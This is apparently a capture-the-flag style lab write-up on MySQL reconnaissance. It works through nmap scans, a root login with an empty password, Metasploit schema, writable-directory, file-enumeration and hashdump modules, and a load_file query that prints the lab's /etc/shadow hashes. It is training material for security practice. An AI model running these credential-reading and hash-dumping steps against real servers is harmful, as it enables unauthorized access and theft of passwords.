# MySQL Recon: Basics

### Overview

> In this challenge we will look at the basics of MySQL server reconnaissance. Please start the lab and answer the following questions:
>
> **Questions**
>
> 1. What is the version of MySQL server?
> 2. What command is used to connect to remote MySQL database?
> 3. How many databases are present on the database server?
> 4. How many records are present in table “authors”? This table is present inside the “books” database.
> 5. Dump the schema of all databases from the server using suitable metasploit module?
> 6. How many directories present in the /usr/share/metasploit-framework/data/wordlists/directory.txt, are writable? List the names.
> 7. How many of sensitive files present in /usr/share/metasploit-framework/data/wordlists/sensitive\_files.txt are readable? List the names.
> 8. Find the system password hash for user "root".
> 9. How many database users are present on the database server? Lists their names and password hashes.
> 10. Check whether anonymous login is allowed on MySQL Server.
> 11. Check whether “InteractiveClient” capability is supported on the MySQL server.
> 12. Enumerate the users present on MySQL database server using mysql-users nmap script.
> 13. List all databases stored on the MySQL Server using nmap script.
> 14. Find the data directory used by mysql server using nmap script.
> 15. Check whether File Privileges can be granted to non admin users using mysql\_audi nmap script.
> 16. Dump all user hashes using  nmap script.
> 17. Find the number of records stored in table “authors” in database “books” stored on MySQL Server using mysql-query nmap script.
>
> Instructions:&#x20;
>
> * This lab is dedicated to you! No other users are on this network :)
> * Once you start the lab, you will have access to a root terminal of a Kali instance
> * Your Kali has an interface with IP address 192.X.Y.Z. Run "ip addr" to know the values of X and Y.
> * The Target machine should be located at the IP address 192.X.Y.3.
> * Do not attack the gateway located at IP address 192.X.Y.1



> 🔬 [MySQL Recon: Basics](https://attackdefense.com/challengedetails?cid=529)
>
> * Target IP: `192.15.56.3`
> * `MySQL` server reconnaisance.

```bash
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
207646: eth0@if207647: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.3/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
207649: eth1@if207650: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:0f:38:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.15.56.2/24 brd 192.15.56.255 scope global eth1
       valid_lft forever preferred_lft forever
       
root@attackdefense:~# nmap -sn 192.15.56.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 15:41 UTC
Nmap scan report for linux (192.15.56.1)
Host is up (0.000057s latency).
MAC Address: 02:42:3C:D2:B8:E3 (Unknown)
Nmap scan report for target-1 (192.15.56.3)
Host is up (0.000016s latency).
MAC Address: 02:42:C0:0F:38:03 (Unknown)
Nmap scan report for attackdefense.com (192.15.56.2)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.01 seconds

root@attackdefense:~# nmap 192.15.56.3   
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 15:42 UTC
Nmap scan report for target-1 (192.15.56.3)
Host is up (0.000025s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:C0:0F:38:03 (Unknown)
```

> 1. What is the version of MySQL server?

Answer: `MySQL 5.5.62`

```bash
Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
root@attackdefense:~# nmap -sV 192.15.56.3
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 15:42 UTC
Nmap scan report for target-1 (192.15.56.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
MAC Address: 02:42:C0:0F:38:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```

> 2. What command is used to connect to remote MySQL database?

Answer: `mysql -h 192.15.56.3 -u root`

```bash
root@attackdefense:~# mysql -h 192.15.56.3 -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 44
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

> 3. How many databases are present on the database server?

Answer: `11`

```bash
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| books              |
| data               |
| mysql              |
| password           |
| performance_schema |
| secret             |
| store              |
| upload             |
| vendors            |
| videos             |
+--------------------+
11 rows in set (0.000 sec)

MySQL [(none)]> use books;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [books]> show tables;
+-----------------+
| Tables_in_books |
+-----------------+
| authors         |
+-----------------+
1 row in set (0.001 sec)

MySQL [books]> select * from authors;
+----+------------+-----------+-----------------------------+------------+---------------------+
| id | first_name | last_name | email                       | birthdate  | added               |
+----+------------+-----------+-----------------------------+------------+---------------------+
|  1 | Gregoria   | Lowe      | gutmann.rebekah@example.net | 1982-03-09 | 1983-01-11 11:25:43 |
|  2 | Ona        | Anderson  | ethelyn02@example.net       | 1980-06-02 | 1972-05-05 07:26:52 |
|  3 | Emile      | Lakin     | rippin.freda@example.com    | 1979-04-06 | 2010-05-30 20:03:07 |
|  4 | Raul       | Barton    | mschiller@example.com       | 1976-05-06 | 1979-02-08 12:32:29 |
|  5 | Sofia      | Collier   | rodrigo34@example.net       | 1978-06-09 | 1991-05-01 10:02:54 |
|  6 | Wellington | Fay       | jared98@example.com         | 2011-08-11 | 1992-05-27 23:20:20 |
|  7 | Garnet     | Braun     | hickle.howell@example.net   | 1990-04-27 | 2010-04-13 09:48:36 |
|  8 | Alessia    | Kuphal    | skiles.reggie@example.net   | 1978-04-06 | 2014-08-22 21:23:00 |
|  9 | Deven      | Carroll   | savanah.zulauf@example.net  | 2007-02-15 | 1998-02-16 11:45:32 |
| 10 | Issac      | Stanton   | ozella10@example.net        | 2013-10-13 | 1976-12-09 13:18:45 |
+----+------------+-----------+-----------------------------+------------+---------------------+
10 rows in set (0.000 sec)
```

> 4. How many records are present in table “authors”? This table is present inside the “books” database.

Answer: `10`

```bash
MySQL [books]> select count(*) from authors;
+----------+
| count(*) |
+----------+
|       10 |
+----------+
1 row in set (0.000 sec)
```

> 5. Dump the schema of all databases from the server using suitable metasploit module?

```bash
msf5 > use auxiliary/scanner/mysql/mysql_schemadump 
msf5 auxiliary(scanner/mysql/mysql_schemadump) > options

Module options (auxiliary/scanner/mysql/mysql_schemadump):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   DISPLAY_RESULTS  true             yes       Display the Results to the Screen
   PASSWORD                          no        The password for the specified username
   RHOSTS                            yes       The target address range or CIDR identifier
   RPORT            3306             yes       The target port (TCP)
   THREADS          1                yes       The number of concurrent threads
   USERNAME                          no        The username to authenticate as

msf5 auxiliary(scanner/mysql/mysql_schemadump) > set RHOSTS 192.15.56.3
RHOSTS => 192.15.56.3
msf5 auxiliary(scanner/mysql/mysql_schemadump) > set USERNAME root
USERNAME => root
msf5 auxiliary(scanner/mysql/mysql_schemadump) > set PASSWORD ""
PASSWORD => 
msf5 auxiliary(scanner/mysql/mysql_schemadump) > exploit

[+] 192.15.56.3:3306      - Schema stored in: /root/.msf4/loot/20240627155300_default_192.15.56.3_mysql_schema_670211.txt
[+] 192.15.56.3:3306      - MySQL Server Schema 
 Host: 192.15.56.3 
 Port: 3306 
 ====================

---
- DBName: books
  Tables:
  - TableName: authors
    Columns:
    - ColumnName: id
      ColumnType: int(11)
    - ColumnName: first_name
      ColumnType: varchar(50)
    - ColumnName: last_name
      ColumnType: varchar(50)
    - ColumnName: email
      ColumnType: varchar(100)
    - ColumnName: birthdate
      ColumnType: date
    - ColumnName: added
      ColumnType: timestamp
- DBName: data
  Tables: []
- DBName: password
  Tables: []
- DBName: secret
  Tables: []
- DBName: store
  Tables: []
- DBName: upload
  Tables: []
- DBName: vendors
  Tables: []
- DBName: videos
  Tables: []

[*] 192.15.56.3:3306      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> 6. How many directories present in the `/usr/share/metasploit-framework/data/wordlists/directory.txt`, are writable? List the names.

Answer: `2 directories are writable: /tmp and /root`

<figure><img src="../../../../../.gitbook/assets/image (85).png" alt=""><figcaption><p>writable directories</p></figcaption></figure>

```bash
msf5 > use auxiliary/scanner/mysql/mysql_writable_dirs 
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > options

Module options (auxiliary/scanner/mysql/mysql_writable_dirs):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DIR_LIST                    yes       List of directories to test
   FILE_NAME  ZdAOtBtH         yes       Name of file to write
   PASSWORD                    no        The password for the specified username
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      3306             yes       The target port (TCP)
   THREADS    1                yes       The number of concurrent threads
   USERNAME   root             yes       The username to authenticate as

msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set RHOSTS 192.15.56.3
RHOSTS => 192.15.56.3
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
DIR_LIST => /usr/share/metasploit-framework/data/wordlists/directory.txt
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set VERBOSE false
VERBOSE => false
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set PASSWORD ""
PASSWORD => 
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > advanced

Module advanced options (auxiliary/scanner/mysql/mysql_writable_dirs):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   CHOST                                 no        The local client address
   CPORT                                 no        The local client port
   ConnectTimeout       10               yes       Maximum number of seconds to establish a TCP connection
   Proxies                               no        A proxy chain of format type:host:port[,type:host:port][...]
   SSL                  false            no        Negotiate SSL/TLS for outgoing connections
   SSLCipher                             no        String for SSL cipher - "DHE-RSA-AES256-SHA" or "ADH"
   SSLVerifyMode        PEER             no        SSL verification method (Accepted: CLIENT_ONCE, FAIL_IF_NO_PEER_CERT, NONE, PEER)
   SSLVersion           Auto             yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)
   ShowProgress         true             yes       Display progress messages during a scan
   ShowProgressPercent  10               yes       The interval in percent that progress should be shown
   VERBOSE              false            no        Enable detailed status messages
   WORKSPACE                             no        Specify the workspace for this module

msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > exploit

[!] 192.15.56.3:3306      - For every writable directory found, a file called ZdAOtBtH with the text test will be written to the directory.
[*] 192.15.56.3:3306      - Login...
[*] 192.15.56.3:3306      - Checking /tmp...
[+] 192.15.56.3:3306      - /tmp is writeable
[*] 192.15.56.3:3306      - Checking /etc/passwd...
[!] 192.15.56.3:3306      - Can't create/write to file '/etc/passwd/ZdAOtBtH' (Errcode: 20)
[*] 192.15.56.3:3306      - Checking /etc/shadow...
[!] 192.15.56.3:3306      - Can't create/write to file '/etc/shadow/ZdAOtBtH' (Errcode: 20)
[*] 192.15.56.3:3306      - Checking /root...
[+] 192.15.56.3:3306      - /root is writeable
[*] 192.15.56.3:3306      - Checking /home...
[!] 192.15.56.3:3306      - Can't create/write to file '/home/ZdAOtBtH' (Errcode: 13)
[*] 192.15.56.3:3306      - Checking /etc...
[!] 192.15.56.3:3306      - Can't create/write to file '/etc/ZdAOtBtH' (Errcode: 13)
[*] 192.15.56.3:3306      - Checking /etc/hosts...
[!] 192.15.56.3:3306      - Can't create/write to file '/etc/hosts/ZdAOtBtH' (Errcode: 20)
[*] 192.15.56.3:3306      - Checking /usr/share...
[!] 192.15.56.3:3306      - Can't create/write to file '/usr/share/ZdAOtBtH' (Errcode: 13)
[*] 192.15.56.3:3306      - Checking /etc/config...
[!] 192.15.56.3:3306      - Can't create/write to file '/etc/config/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /data...
[!] 192.15.56.3:3306      - Can't create/write to file '/data/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /webdav...
[!] 192.15.56.3:3306      - Can't create/write to file '/webdav/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /doc...
[!] 192.15.56.3:3306      - Can't create/write to file '/doc/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /icons...
[!] 192.15.56.3:3306      - Can't create/write to file '/icons/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /manual...
[!] 192.15.56.3:3306      - Can't create/write to file '/manual/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /pro...
[!] 192.15.56.3:3306      - Can't create/write to file '/pro/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /secure...
[!] 192.15.56.3:3306      - Can't create/write to file '/secure/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /poc...
[!] 192.15.56.3:3306      - Can't create/write to file '/poc/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /pro...
[!] 192.15.56.3:3306      - Can't create/write to file '/pro/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /dir...
[!] 192.15.56.3:3306      - Can't create/write to file '/dir/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /Benefits...
[!] 192.15.56.3:3306      - Can't create/write to file '/Benefits/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /Data...
[!] 192.15.56.3:3306      - Can't create/write to file '/Data/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /Invitation...
[!] 192.15.56.3:3306      - Can't create/write to file '/Invitation/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /Office...
[!] 192.15.56.3:3306      - Can't create/write to file '/Office/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /Site...
[!] 192.15.56.3:3306      - Can't create/write to file '/Site/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /Admin...
[!] 192.15.56.3:3306      - Can't create/write to file '/Admin/ZdAOtBtH' (Errcode: 2)
[*] 192.15.56.3:3306      - Checking /etc...
[!] 192.15.56.3:3306      - Can't create/write to file '/etc/ZdAOtBtH' (Errcode: 13)
[*] 192.15.56.3:3306      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> 7. How many of sensitive files present in `/usr/share/metasploit-framework/data/wordlists/sensitive_files.txt` are readable? List the names.

Answer:&#x20;

> `10` sensitive files are readable: `/etc/passwd`, `/etc/shadow`, `/etc/group`, `/etc/mysql/my.cn`, `/etc/hosts`, `/etc/hosts.allow`, `/etc/hosts.deny`, `/etc/issue`, `/etc/fstab`, `/proc/version`

```bash
msf5 > use auxiliary/scanner/mysql/mysql_file_enum 
msf5 auxiliary(scanner/mysql/mysql_file_enum) > options

Module options (auxiliary/scanner/mysql/mysql_file_enum):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   DATABASE_NAME  mysql            yes       Name of database to use
   FILE_LIST                       yes       List of directories to enumerate
   PASSWORD                        no        The password for the specified username
   RHOSTS                          yes       The target address range or CIDR identifier
   RPORT          3306             yes       The target port (TCP)
   TABLE_NAME     VgKcqADt         yes       Name of table to use - Warning, if the table already exists its contents will be corrupted
   THREADS        1                yes       The number of concurrent threads
   USERNAME       root             yes       The username to authenticate as

msf5 auxiliary(scanner/mysql/mysql_file_enum) > set RHOSTS 192.15.56.3
RHOSTS => 192.15.56.3
msf5 auxiliary(scanner/mysql/mysql_file_enum) > set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files
sensitive_files.txt      sensitive_files_win.txt  
msf5 auxiliary(scanner/mysql/mysql_file_enum) > set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
FILE_LIST => /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
msf5 auxiliary(scanner/mysql/mysql_file_enum) > exploit

[+] 192.15.56.3:3306      - /etc/passwd is a file and exists
[+] 192.15.56.3:3306      - /etc/shadow is a file and exists
[+] 192.15.56.3:3306      - /etc/group is a file and exists
[+] 192.15.56.3:3306      - /etc/mysql/my.cnf is a file and exists
[+] 192.15.56.3:3306      - /etc/hosts is a file and exists
[+] 192.15.56.3:3306      - /etc/hosts.allow is a file and exists
[+] 192.15.56.3:3306      - /etc/hosts.deny is a file and exists
[+] 192.15.56.3:3306      - /etc/issue is a file and exists
[+] 192.15.56.3:3306      - /etc/fstab is a file and exists
[+] 192.15.56.3:3306      - /proc/version is a file and exists
[*] 192.15.56.3:3306      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> 8. Find the system password hash for user "root".

Answer: `S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/`

```bash
root@attackdefense:~# mysql -h 192.15.56.3 -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 50
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> select load_file("/etc/shadow");
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| load_file("/etc/shadow")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::
daemon:*:17850:0:99999:7:::
bin:*:17850:0:99999:7:::
sys:*:17850:0:99999:7:::
sync:*:17850:0:99999:7:::
games:*:17850:0:99999:7:::
man:*:17850:0:99999:7:::
lp:*:17850:0:99999:7:::
mail:*:17850:0:99999:7:::
news:*:17850:0:99999:7:::
uucp:*:17850:0:99999:7:::
proxy:*:17850:0:99999:7:::
www-data:*:17850:0:99999:7:::
backup:*:17850:0:99999:7:::
list:*:17850:0:99999:7:::
irc:*:17850:0:99999:7:::
gnats:*:17850:0:99999:7:::
nobody:*:17850:0:99999:7:::
libuuid:!:17850:0:99999:7:::
syslog:*:17850:0:99999:7:::
mysql:!:17857:0:99999:7:::
dbadmin:$6$vZ3Fv3x6$qdB/lOAC1EtlKEC2H8h5f7t33j65WDbHHV50jloFkxFBeQC8QkdbQKpHEp/BkVMQD2C2AFPkYW3.W7jMlMbl5.:17861:0:99999:7:::
 |
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.000 sec)
```

<details>

<summary>Flag:</summary>

`S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/`

</details>

> 9. How many database users are present on the database server? Lists their names and password hashes.

Answer:&#x20;

> `8` db users are present:
>
> `debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D`
>
> `root:`
>
> `filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B`
>
> `ultra:*827EC562775DC9CE458689D36687DCED320F34B0`
>
> `guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646`
>
> `sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0`
>
> `udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9`
>
> `sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14`

```bash
msf5 > use auxiliary/scanner/mysql/mysql_hashdump 
msf5 auxiliary(scanner/mysql/mysql_hashdump) > options

Module options (auxiliary/scanner/mysql/mysql_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS                     yes       The target address range or CIDR identifier
   RPORT     3306             yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads
   USERNAME                   no        The username to authenticate as

msf5 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS 192.15.56.3
RHOSTS => 192.15.56.3
msf5 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME root
USERNAME => root
msf5 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD ""
PASSWORD => 
msf5 auxiliary(scanner/mysql/mysql_hashdump) > exploit

[+] 192.15.56.3:3306      - Saving HashString as Loot: root:
[+] 192.15.56.3:3306      - Saving HashString as Loot: root:
[+] 192.15.56.3:3306      - Saving HashString as Loot: root:
[+] 192.15.56.3:3306      - Saving HashString as Loot: root:
[+] 192.15.56.3:3306      - Saving HashString as Loot: debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
[+] 192.15.56.3:3306      - Saving HashString as Loot: root:
[+] 192.15.56.3:3306      - Saving HashString as Loot: filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.15.56.3:3306      - Saving HashString as Loot: ultra:*827EC562775DC9CE458689D36687DCED320F34B0
[+] 192.15.56.3:3306      - Saving HashString as Loot: guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.15.56.3:3306      - Saving HashString as Loot: sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.15.56.3:3306      - Saving HashString as Loot: udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.15.56.3:3306      - Saving HashString as Loot: sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14
[*] 192.15.56.3:3306      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> 10. Check whether anonymous login is allowed on MySQL Server.

Answer: _`root`_` ``and`` `_`anonymous`_` ``users login is permitted without password.`

```bash
root@attackdefense:~# nmap --script mysql-empty-password -p3306 192.15.56.3
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 16:09 UTC
Nmap scan report for target-1 (192.15.56.3)
Host is up (0.000044s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-empty-password: 
|_  root account has empty password
MAC Address: 02:42:C0:0F:38:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
```

> 11. Check whether “InteractiveClient” capability is supported on the MySQL server.

Answer: `"InteractiveClient" is supported on the server.`

<figure><img src="../../../../../.gitbook/assets/image (86).png" alt=""><figcaption><p>InteractiveClient</p></figcaption></figure>

```bash
root@attackdefense:~# nmap --script mysql-info -p3306 192.15.56.3
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 16:10 UTC
Nmap scan report for target-1 (192.15.56.3)
Host is up (0.000043s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.62-0ubuntu0.14.04.1
|   Thread ID: 54
|   Capabilities flags: 63487
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, SupportsTransactions, FoundRows, SupportsLoadDataLocal, IgnoreSigpipes, SupportsCompression, Support41Auth, ODBCClient, LongPassword, InteractiveClient, LongColumnFlag, ConnectWithDatabase, Speaks41ProtocolNew, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: @`Bf^$7']!)Jv9Ty)]xc
|_  Auth Plugin Name: 96
MAC Address: 02:42:C0:0F:38:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
```

> 12. Enumerate the users present on MySQL database server using `mysql-users` nmap script.

> **Answer:**&#x20;
>
> DB users are: `filetest`, `root`, `debian-sys-maint`, `guest`, `sigver`, `sysadmin`, `udadmin`, `ultra`

```bash
root@attackdefense:~# nmap --script mysql-users --script-args "mysqluser='root',mysqlpass=''" -p3306 192.15.56.3
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 16:18 UTC
Nmap scan report for target-1 (192.15.56.3)
Host is up (0.000042s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-users: 
|   filetest
|   root
|   debian-sys-maint
|   guest
|   sigver
|   sysadmin
|   udadmin
|_  ultra
MAC Address: 02:42:C0:0F:38:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
```

> 13. List all databases stored on the MySQL Server using nmap script.

> **Answer:**
>
> MySQL databases are `information_schema`, `books`, `data`, `mysql`, `password`, `performance_schema`, `secret`, `store`, `upload`, `vendors`, `videos`

```
root@attackdefense:~# nmap --script mysql-databases --script-args "mysqluser='root',mysqlpass=''" -p3306 192.15.56.3
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 16:19 UTC
Nmap scan report for target-1 (192.15.56.3)
Host is up (0.000043s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-databases: 
|   information_schema
|   books
|   data
|   mysql
|   password
|   performance_schema
|   secret
|   store
|   upload
|   vendors
|_  videos
MAC Address: 02:42:C0:0F:38:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
```

> 14. Find the data directory used by mysql server using nmap script.

> **Answer:**
>
> The data directory used by MySQL server is _datadir:_ `var/lib/mysql/`

<figure><img src="../../../../../.gitbook/assets/image (87).png" alt=""><figcaption><p>datadir</p></figcaption></figure>

```bash
root@attackdefense:~# nmap --script mysql-variables --script-args "mysqluser='root',mysqlpass=''" -p3306 192.15.56.3
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 16:21 UTC
Nmap scan report for target-1 (192.15.56.3)
Host is up (0.000046s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-variables: 
|   auto_increment_increment: 1
|   auto_increment_offset: 1
|   autocommit: ON
|   automatic_sp_privileges: ON
|   back_log: 50
|   basedir: /usr
|   big_tables: OFF
|   binlog_cache_size: 32768
|   binlog_direct_non_transactional_updates: OFF
|   binlog_format: STATEMENT
|   binlog_stmt_cache_size: 32768
|   bulk_insert_buffer_size: 8388608
|   character_set_client: latin1
|   character_set_connection: latin1
|   character_set_database: latin1
|   character_set_filesystem: binary
|   character_set_results: latin1
|   character_set_server: latin1
|   character_set_system: utf8
|   character_sets_dir: /usr/share/mysql/charsets/
|   collation_connection: latin1_swedish_ci
```

> 15. Check whether File Privileges can be granted to non admin users using `mysql_audit` nmap script.

> **Answer:**&#x20;
>
> `No File privileges can be granted` to non admin users.

<figure><img src="../../../../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

```bash
root@attackdefense:~# nmap --script mysql-audit --script-args "mysql-audit.username='root',mysql-aduit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p3306 192.15.56.3
Starting Nmap 7.70 ( https://nmap.org ) at 2024-06-27 16:27 UTC
Nmap scan report for target-1 (192.15.56.3)
Host is up (0.000040s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-audit: 
|   CIS MySQL Benchmarks v1.0.2
|       3.1: Skip symbolic links => FAIL
|       3.2: Logs not on system partition => PASS
|       3.2: Logs not on database partition => PASS
|       4.1: Supported version of MySQL => REVIEW
|         Version: 5.5.62-0ubuntu0.14.04.1
|       4.4: Remove test database => PASS
|       4.5: Change admin account name => PASS
|       4.7: Verify Secure Password Hashes => PASS
|       4.9: Wildcards in user hostname => PASS
|         The following users were found with wildcards in hostname
|           filetest
|           root
|       4.10: No blank passwords => PASS
|         The following users were found having blank/empty passwords
|           root
|       4.11: Anonymous account => PASS
|       5.1: Access to mysql database => REVIEW
|         Verify the following users that have access to the MySQL database
|           user  host
|       5.2: Do not grant FILE privileges to non Admin users => PASS
|         The following users were found having the FILE privilege
|           filetest
|       5.3: Do not grant PROCESS privileges to non Admin users => PASS
|       5.4: Do not grant SUPER privileges to non Admin users => PASS
|       5.5: Do not grant SHUTDOWN privileges to non Admin users => PASS
|       5.6: Do not grant CREATE USER privileges to non Admin users => PASS
|       5.7: Do not grant RELOAD privileges to non Admin users => PASS
|       5.8: Do not grant GRANT privileges to non Admin users => PASS
|       6.2: Disable Load data local => FAIL
|       6.3: Disable old password hashing => FAIL
|       6.4: Safe show database => FAIL
|       6.5: Secure auth => FAIL
|       6.6: Grant tables => FAIL
|       6.7: Skip merge => FAIL
|       6.8: Skip networking => FAIL
|       6.9: Safe user create => FAIL
|       6.10: Skip symbolic links => FAIL
|     
|     Additional information
|       The audit was performed using the db-account: root
|_      The following admin accounts were excluded from the audit: root,debian-sys-maint
MAC Address: 02:42:C0:0F:38:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
```

